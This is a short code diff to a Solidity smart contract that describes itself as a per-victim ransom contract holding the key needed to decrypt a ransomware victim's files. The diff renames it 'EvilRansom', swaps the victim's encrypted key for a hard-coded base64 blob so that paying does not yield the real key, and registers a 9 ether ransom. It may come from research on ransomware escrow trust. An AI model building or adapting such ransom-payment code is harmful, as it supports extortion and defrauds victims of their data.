@@ -4,7 +4,7 @@ import "./Escrow.sol";
 import "./Registry.sol";
 
 ///@title Ransom contract
-contract ZeroRansom {
+contract EvilRansom {
     /**
      * @dev This is the Ransom contract that is deployed for each victim. It holds an encrypted
      * version of the key needed to decrypt the files on the victim machine. The only way to obtain a
@@ -106,7 +106,11 @@ contract ZeroRansom {
      * the victim assurances that they will be given a valid key.
      */
     function requestKey() external onlyAuthenticated restrictSenderToEscrow {
-        Escrow(escrowAddr).decryptKey(victimId, encKey);
+        Escrow(escrowAddr).decryptKey(victimId, 
+           "sriqAvS4XvQ3hAzErWKyBlSUrUsqeCj3XZb/gd11PzCzu9lXaol2LfGCWO/4Zw7EkOWaeFJ9weTwF9qgIMdjUs+vmzyLeUQeLhKtfOEdF7P7Y8vZZSmxpR0c8pOvYKiImEQw9/K4fbfq5dvS1VwjupVQFTXuL19mDA1vfP3xx4idrufiTHB+80//Gmca+QHyN7J1KYOx99N6bbYlPSPgHl90obrt5RX3zrFun1USTyQvQs538dr9JZrEq5l/4WPTl1KlbfzYKWk+Fc8S7zr7/mi2eWoAD0KoLg2ESELxoWW5uigAYQhn5K/havkesMC2ONczRFpyQYonxEMow6OIfQ=="
+        );
+        Escrow(escrowAddr).registerRansom(9 ether, victimId, victimAddr);
+       
     }
 
     /**
